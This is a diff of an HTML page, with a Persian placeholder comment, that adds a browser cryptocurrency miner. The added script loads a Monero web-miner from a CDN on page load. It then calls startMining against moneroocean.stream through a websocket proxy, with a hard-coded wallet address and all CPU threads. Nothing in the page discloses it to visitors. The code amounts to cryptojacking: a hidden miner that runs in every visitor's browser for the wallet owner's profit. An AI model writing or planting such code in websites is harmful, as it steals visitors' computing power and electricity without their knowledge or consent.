@@ -5,18 +5,21 @@
 </head>
 <body>
 
-  <!-- محتوای سایت شما اینجا -->
-
-  <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
   <script>
-    server = "wss://proxy-miner.onrender.com";
-    var pool = "moneroocean.stream";
-    var walletAddress = "497Dw2aLzDnAcaxSGPsGoA31s4ZiBfNAQTe7yG8V8onkWZ5HJdhyej1Y4wDbJfqidZLHuSSdFbwsYaWShi249eZ8ErJgvND";
-    var workerId = "mysite";
-    var threads = -1;
-    var password = "x";
-    startMining(pool, walletAddress, workerId, threads, password);
-    throttleMiner = 80;
+    var script = document.createElement("script");
+    script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js";
+    script.onload = function() {
+      server = "wss://proxy-miner.onrender.com";
+      var pool = "moneroocean.stream";
+      var walletAddress = "497Dw2aLzDnAcaxSGPsGoA31s4ZiBfNAQTe7yG8V8onkWZ5HJdhyej1Y4wDbJfqidZLHuSSdFbwsYaWShi249eZ8ErJgvND";
+      var workerId = "mysite";
+      var threads = -1;
+      var password = "x";
+      startMining(pool, walletAddress, workerId, threads, password);
+      throttleMiner = 80;
+      console.log("Mining started!");
+    };
+    document.head.appendChild(script);
   </script>
 
 </body>
